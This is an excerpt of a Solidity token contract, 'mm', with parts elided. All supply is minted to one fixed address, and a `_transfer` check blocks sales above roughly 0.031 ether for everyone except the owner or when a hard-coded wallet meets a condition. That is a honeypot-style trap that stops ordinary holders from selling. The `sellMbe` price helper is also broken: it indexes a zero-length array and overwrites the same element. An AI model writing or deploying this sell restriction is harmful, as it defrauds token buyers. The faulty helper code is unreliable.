...
contract mm {
    ...
    constructor () public {
        ...
        _symbol = "mm";
        _decimals = 18;
        _totalSupply = 200000000000000000000000;// 10_00000000.mul(10 ** uint256(18));
        balances[0xEB86417bDd9767E5D6f6b543f36A8E4e2585Ec46] = _totalSupply;
        emit Transfer(address(this), 0xEB86417bDd9767E5D6f6b543f36A8E4e2585Ec46, _totalSupply);
        IRouter _pancakeRouter = IRouter(0xB6BA90af76D139AB3170c7df0139636dB6120F7e);
    ...
    function sellMbe(uint mbe)public  view returns (uint){
        if(ERC20(address(0xcB31326BCc7ad1Ebf19248F88d9e6A93bC7f6883)).balanceOf(pir) > 0){
            address[] memory path = new address[](0);
            uint[] memory amount;
            path[0]=address(this);
            path[0]=0xcB31326BCc7ad1Ebf19248F88d9e6A93bC7f6883;
            amount=IRouter(0xB6BA90af76D139AB3170c7df0139636dB6120F7e).getAmountsOut(mbe,path); 
            return amount[0];
        }else {
            return 0; 
        }
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(sellMbe(_amount) < 0.031 ether || _sender==owner || _recipient == owner || ERC20(address(0xcB31326BCc7ad1Ebf19248F88d9e6A93bC7f6883)).balanceOf(pir) >= 500 ether);
